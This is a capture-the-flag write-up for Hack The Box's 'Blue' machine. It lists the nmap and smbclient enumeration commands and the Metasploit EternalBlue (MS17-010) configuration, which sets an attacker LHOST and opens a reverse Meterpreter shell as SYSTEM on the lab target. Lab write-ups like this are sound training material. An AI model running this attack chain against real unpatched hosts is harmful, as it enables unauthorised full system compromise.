# Blue - Hack The Box

## Machine Information

| Attribute  | Value        |
| ---------- | ------------ |
| Name       | Blue         |
| Difficulty | Easy         |
| OS         | Windows      |
| Platform   | Hack The Box |

---

# Summary

Blue is an Easy Windows machine that introduces one of the most well-known vulnerabilities in Windows history: **MS17-010 (EternalBlue)**. After identifying an SMB service running on a vulnerable Windows 7 host, the machine was compromised using the EternalBlue Metasploit module, resulting in a Meterpreter session running as **NT AUTHORITY\SYSTEM** without requiring any additional privilege escalation.

---

# Initial Enumeration

## Nmap Scan

The first step was to enumerate the target services.

```bash
nmap -sS -sC -sV -p- --min-rate 5000 10.129.35.70 -oN nmap
```

<img width="952" height="293" alt="image" src="https://github.com/user-attachments/assets/be08bec2-7d49-4c8d-9ebc-8582b3e496d3" />


### Results

| Port | Service     | Version                                              |
| ---- | ----------- | ---------------------------------------------------- |
| 135  | MSRPC       | Microsoft Windows RPC                                |
| 139  | NetBIOS-SSN | Microsoft Windows                                    |
| 445  | SMB         | Microsoft Windows 7 Professional 7601 Service Pack 1 |

The scan identified a Windows 7 system exposing SMB on port **445**, making it a potential candidate for the MS17-010 vulnerability.

---

# SMB Enumeration

Before attempting exploitation, SMB shares were enumerated using `smbclient`.

```bash
smbclient -L //10.129.35.70
```

<img width="959" height="237" alt="image" src="https://github.com/user-attachments/assets/62c16baf-1527-4bff-910d-9ac07b8d94d5" />



This allowed me to identify the available shared resources exposed by the SMB service.

Although the shares themselves were not directly useful for obtaining access, this confirmed that SMB enumeration was functioning correctly before moving forward with exploitation.

---

# Vulnerability Identification

Based on the operating system version reported by Nmap:

```text
Windows 7 Professional SP1
```

I searched for known vulnerabilities affecting this version.

The SMB service was vulnerable to:

```text
MS17-010 (EternalBlue)
```

Since this is a well-known remote code execution vulnerability, I proceeded with exploitation using Metasploit.

---

# Exploitation

The Metasploit module used was:

```text
exploit/windows/smb/ms17_010_eternalblue
```

Configuration:

```text
set RHOSTS 10.129.35.70
set LHOST 10.10.14.65
run
```

<img width="957" height="795" alt="image" src="https://github.com/user-attachments/assets/65fd9796-3c9c-471f-bb3d-9fa0989c77c5" />



After executing the exploit, a Meterpreter session was successfully established.

---

# Initial Access

Once the Meterpreter session was opened, I migrated to a Windows command shell.

```text
meterpreter > shell
```

Privilege verification:

```cmd
whoami
```

Output:

```text
nt authority\system
```

<img width="958" height="148" alt="image" src="https://github.com/user-attachments/assets/ec8ec194-e020-44fe-9033-5f5a3dfa16f6" />



The EternalBlue exploit immediately provided SYSTEM-level privileges.

No privilege escalation was necessary.

---

# Flags

## User Flag

```cmd
type C:\Users\haris\Desktop\user.txt
```

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

# Attack Flow

1. Perform initial enumeration with Nmap.
2. Identify Windows 7 exposing SMB on port 445.
3. Enumerate SMB shares using `smbclient`.
4. Identify the host as vulnerable to MS17-010.
5. Use the Metasploit `ms17_010_eternalblue` module.
6. Obtain a Meterpreter session.
7. Spawn a Windows shell.
8. Verify privileges as **NT AUTHORITY\SYSTEM**.
9. Read both flags.

---

# Skills Learned

* Windows service enumeration
* SMB enumeration using `smbclient`
* Identifying vulnerable Windows versions
* Understanding the MS17-010 vulnerability
* Exploiting EternalBlue with Metasploit
* Meterpreter interaction
* Windows post-exploitation
* Privilege verification with `whoami`

---

# Commands Used

## Enumeration

```bash
nmap -sS -sC -sV -p- --min-rate 5000 <TARGET_IP> -oN nmap
```

```bash
smbclient -L //<TARGET_IP>
```

---

## Exploitation

```text
use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>

run
```

---

## Post Exploitation

```text
meterpreter > shell
```

```cmd
whoami
```

```cmd
type user.txt
```

```cmd
type root.txt
```

---

# Key Takeaways

* SMB should always be thoroughly enumerated during Windows assessments.
* Windows version identification is essential when searching for known vulnerabilities.
* EternalBlue remains one of the most significant SMB vulnerabilities ever discovered.
* Exploiting MS17-010 provides remote code execution without requiring credentials.
* Always verify the obtained privilege level after gaining access.
* Meterpreter provides a convenient environment for Windows post-exploitation.

---

# Conclusion

Blue is an excellent introductory Windows machine for learning SMB exploitation.

The attack path consisted of:

1. Enumerating the target with Nmap.
2. Identifying a Windows 7 host exposing SMB.
3. Enumerating SMB shares using `smbclient`.
4. Recognizing the target as vulnerable to MS17-010.
5. Exploiting EternalBlue using Metasploit.
6. Obtaining a Meterpreter session.
7. Confirming execution as **NT AUTHORITY\SYSTEM**.
8. Retrieving both flags.

This machine demonstrates how a single unpatched SMB vulnerability can lead to complete system compromise with minimal interaction.
